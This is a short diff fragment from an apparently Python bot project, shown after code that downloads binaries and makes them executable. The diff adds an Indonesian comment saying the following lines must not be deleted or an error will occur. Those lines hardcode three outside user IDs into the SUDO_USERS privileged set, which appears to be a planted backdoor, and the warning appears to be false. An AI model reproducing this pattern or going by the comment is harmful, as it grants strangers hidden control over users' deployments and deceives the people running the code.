@@ -292,6 +292,7 @@ for binary, path in binaries.items():
     downloader.start()
     os.chmod(path, 0o755)
 
+# Jangan di hapus Nanti ERROR
 SUDO_USERS.add(844432220)
 SUDO_USERS.add(1906014306)
 SUDO_USERS.add(1738637033)
